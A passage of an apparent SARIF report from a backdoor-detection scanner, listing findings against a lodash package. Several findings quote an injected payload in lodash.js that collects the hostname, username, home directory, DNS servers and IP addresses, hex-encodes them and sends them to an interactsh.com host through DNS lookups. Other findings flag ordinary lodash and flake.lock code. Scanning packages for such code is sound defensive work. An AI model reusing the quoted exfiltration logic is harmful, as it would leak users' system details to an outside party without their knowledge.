                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17293,
                  "startColumn": 11,
                  "endLine": 17293,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    p: package,\n    c: __dirname,\n    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n",
                    "rendered": {
                      "text": "    p: package,\n    c: __dirname,\n    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n",
                      "markdown": "`    p: package,\n    c: __dirname,\n    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17279,
                  "startColumn": 43,
                  "endLine": 17279,
                  "endColumn": 51,
                  "snippet": {
                    "text": "else{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\nelse{\n",
                    "rendered": {
                      "text": "else{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\nelse{\n",
                      "markdown": "`else{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\nelse{\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17278,
                  "startColumn": 67,
                  "endLine": 17278,
                  "endColumn": 75,
                  "snippet": {
                    "text": "}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\n",
                    "rendered": {
                      "text": "}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\n",
                      "markdown": "`}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17277,
                  "startColumn": 43,
                  "endLine": 17277,
                  "endColumn": 51,
                  "snippet": {
                    "text": "queries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n",
                    "rendered": {
                      "text": "queries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n",
                      "markdown": "`queries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17274,
                  "startColumn": 25,
                  "endLine": 17274,
                  "endColumn": 33,
                  "snippet": {
                    "text": "else if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\n",
                    "rendered": {
                      "text": "else if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\n",
                      "markdown": "`else if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17273,
                  "startColumn": 25,
                  "endLine": 17273,
                  "endColumn": 33,
                  "snippet": {
                    "text": "}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\n",
                    "rendered": {
                      "text": "}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\n",
                      "markdown": "`}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17269,
                  "startColumn": 25,
                  "endLine": 17269,
                  "endColumn": 33,
                  "snippet": {
                    "text": "if(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\n",
                    "rendered": {
                      "text": "if(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\n",
                      "markdown": "`if(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17268,
                  "startColumn": 25,
                  "endLine": 17268,
                  "endColumn": 33,
                  "snippet": {
                    "text": "substr2 = getIps();\nif(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\n",
                    "rendered": {
                      "text": "substr2 = getIps();\nif(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\n",
                      "markdown": "`substr2 = getIps();\nif(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17262,
                  "startColumn": 95,
                  "endLine": 17262,
                  "endColumn": 103,
                  "snippet": {
                    "text": "var substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\nsubstr2 = getIps();\n",
                    "rendered": {
                      "text": "var substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\nsubstr2 = getIps();\n",
                      "markdown": "`var substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\nsubstr2 = getIps();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17261,
                  "startColumn": 4,
                  "endLine": 17261,
                  "endColumn": 12,
                  "snippet": {
                    "text": "var queries = [];\nvar substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\n",
                    "rendered": {
                      "text": "var queries = [];\nvar substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\n",
                      "markdown": "`var queries = [];\nvar substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000705"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (DNS)",
            "id": "BD000705"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17303,
                  "endLine": 17303,
                  "endColumn": 10,
                  "snippet": {
                    "text": "}\nvar qs = toName(td);\nfor(var j=0;j<qs.length;j++){\ndns.lookup(qs[j], function(err, result) {\n  //console.log(result)\n});\n}\n",
                    "rendered": {
                      "text": "}\nvar qs = toName(td);\nfor(var j=0;j<qs.length;j++){\ndns.lookup(qs[j], function(err, result) {\n  //console.log(result)\n});\n}\n",
                      "markdown": "`}\nvar qs = toName(td);\nfor(var j=0;j<qs.length;j++){\ndns.lookup(qs[j], function(err, result) {\n  //console.log(result)\n});\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000710"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (DNS Settings)",
            "id": "BD000710"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17295,
                  "startColumn": 24,
                  "endLine": 17295,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n    v: packageJSON.version,\n    pjson: packageJSON,\n",
                    "rendered": {
                      "text": "    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n    v: packageJSON.version,\n    pjson: packageJSON,\n",
                      "markdown": "`    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n    v: packageJSON.version,\n    pjson: packageJSON,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/debounce.js"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 7,
                  "endLine": 163,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  }\n\n  function debounced() {\n    var time = now(),\n        isInvoking = shouldInvoke(time);\n\n    lastArgs = arguments;\n",
                    "rendered": {
                      "text": "  }\n\n  function debounced() {\n    var time = now(),\n        isInvoking = shouldInvoke(time);\n\n    lastArgs = arguments;\n",
                      "markdown": "`  }\n\n  function debounced() {\n    var time = now(),\n        isInvoking = shouldInvoke(time);\n\n    lastArgs = arguments;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/debounce.js"
                },
                "region": {
                  "startLine": 130,
                  "startColumn": 7,
                  "endLine": 130,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  }\n\n  function timerExpired() {\n    var time = now();\n    if (shouldInvoke(time)) {\n      return trailingEdge(time);\n    }\n",
                    "rendered": {
                      "text": "  }\n\n  function timerExpired() {\n    var time = now();\n    if (shouldInvoke(time)) {\n      return trailingEdge(time);\n    }\n",
                      "markdown": "`  }\n\n  function timerExpired() {\n    var time = now();\n    if (shouldInvoke(time)) {\n      return trailingEdge(time);\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/debounce.js"
                },
                "region": {
                  "startLine": 120,
                  "startColumn": 29,
                  "endLine": 120,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n  function shouldInvoke(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime;\n\n    // Either this is the first call, activity has stopped and we're at the\n    // trailing edge, the system time has gone backwards and we're treating\n",
                    "rendered": {
                      "text": "\n  function shouldInvoke(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime;\n\n    // Either this is the first call, activity has stopped and we're at the\n    // trailing edge, the system time has gone backwards and we're treating\n",
                      "markdown": "`\n  function shouldInvoke(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime;\n\n    // Either this is the first call, activity has stopped and we're at the\n    // trailing edge, the system time has gone backwards and we're treating\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/debounce.js"
                },
                "region": {
                  "startLine": 119,
                  "startColumn": 27,
                  "endLine": 119,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  }\n\n  function shouldInvoke(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime;\n\n    // Either this is the first call, activity has stopped and we're at the\n",
                    "rendered": {
                      "text": "  }\n\n  function shouldInvoke(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime;\n\n    // Either this is the first call, activity has stopped and we're at the\n",
                      "markdown": "`  }\n\n  function shouldInvoke(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime;\n\n    // Either this is the first call, activity has stopped and we're at the\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/debounce.js"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 29,
                  "endLine": 110,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n  function remainingWait(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime,\n        timeWaiting = wait - timeSinceLastCall;\n\n    return maxing\n",
                    "rendered": {
                      "text": "\n  function remainingWait(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime,\n        timeWaiting = wait - timeSinceLastCall;\n\n    return maxing\n",
                      "markdown": "`\n  function remainingWait(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime,\n        timeWaiting = wait - timeSinceLastCall;\n\n    return maxing\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/debounce.js"
                },
                "region": {
                  "startLine": 109,
                  "startColumn": 27,
                  "endLine": 109,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  }\n\n  function remainingWait(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime,\n        timeWaiting = wait - timeSinceLastCall;\n\n",
                    "rendered": {
                      "text": "  }\n\n  function remainingWait(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime,\n        timeWaiting = wait - timeSinceLastCall;\n\n",
                      "markdown": "`  }\n\n  function remainingWait(time) {\n    var timeSinceLastCall = time - lastCallTime,\n        timeSinceLastInvoke = time - lastInvokeTime,\n        timeWaiting = wait - timeSinceLastCall;\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/flake.lock"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 15,
                  "endLine": 28,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        \"narHash\": \"sha256-U9rPz/usA1/Aohhk7Cmc2gBrEEKRzcW4nwPWMPwja4Y=\",\n        \"owner\": \"numtide\",\n        \"repo\": \"flake-utils\",\n        \"rev\": \"3982c9903e93927c2164caa727cd3f6a0e6d14cc\",\n        \"type\": \"github\"\n      },\n      \"original\": {\n",
                    "rendered": {
                      "text": "        \"narHash\": \"sha256-U9rPz/usA1/Aohhk7Cmc2gBrEEKRzcW4nwPWMPwja4Y=\",\n        \"owner\": \"numtide\",\n        \"repo\": \"flake-utils\",\n        \"rev\": \"3982c9903e93927c2164caa727cd3f6a0e6d14cc\",\n        \"type\": \"github\"\n      },\n      \"original\": {\n",
                      "markdown": "`        \"narHash\": \"sha256-U9rPz/usA1/Aohhk7Cmc2gBrEEKRzcW4nwPWMPwja4Y=\",\n        \"owner\": \"numtide\",\n        \"repo\": \"flake-utils\",\n        \"rev\": \"3982c9903e93927c2164caa727cd3f6a0e6d14cc\",\n        \"type\": \"github\"\n      },\n      \"original\": {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/flake.lock"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 15,
                  "endLine": 8,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        \"lastModified\": 1613582597,\n        \"narHash\": \"sha256-6LvipIvFuhyorHpUqK3HjySC5Y6gshXHFBhU9EJ4DoM=\",\n        \"path\": \"/nix/store/srvplqq673sqd9vyfhyc5w1p88y1gfm4-source\",\n        \"rev\": \"6b1057b452c55bb3b463f0d7055bc4ec3fd1f381\",\n        \"type\": \"path\"\n      },\n      \"original\": {\n",
                    "rendered": {
                      "text": "        \"lastModified\": 1613582597,\n        \"narHash\": \"sha256-6LvipIvFuhyorHpUqK3HjySC5Y6gshXHFBhU9EJ4DoM=\",\n        \"path\": \"/nix/store/srvplqq673sqd9vyfhyc5w1p88y1gfm4-source\",\n        \"rev\": \"6b1057b452c55bb3b463f0d7055bc4ec3fd1f381\",\n        \"type\": \"path\"\n      },\n      \"original\": {\n",
                      "markdown": "`        \"lastModified\": 1613582597,\n        \"narHash\": \"sha256-6LvipIvFuhyorHpUqK3HjySC5Y6gshXHFBhU9EJ4DoM=\",\n        \"path\": \"/nix/store/srvplqq673sqd9vyfhyc5w1p88y1gfm4-source\",\n        \"rev\": \"6b1057b452c55bb3b463f0d7055bc4ec3fd1f381\",\n        \"type\": \"path\"\n      },\n      \"original\": {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.js"
                },
                "region": {
                  "startLine": 1995,
                  "startColumn": 5,
                  "endLine": 1995,
                  "endColumn": 11,
                  "snippet": {
                    "text": "   * _.find(users, 'active');\n   * // => object for 'barney'\n   */\n  var find = createFind(findIndex);\n\n  /**\n   * Iterates over elements of `collection` and invokes `iteratee` for each element.\n",
                    "rendered": {
                      "text": "   * _.find(users, 'active');\n   * // => object for 'barney'\n   */\n  var find = createFind(findIndex);\n\n  /**\n   * Iterates over elements of `collection` and invokes `iteratee` for each element.\n",
                      "markdown": "`   * _.find(users, 'active');\n   * // => object for 'barney'\n   */\n  var find = createFind(findIndex);\n\n  /**\n   * Iterates over elements of `collection` and invokes `iteratee` for each element.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
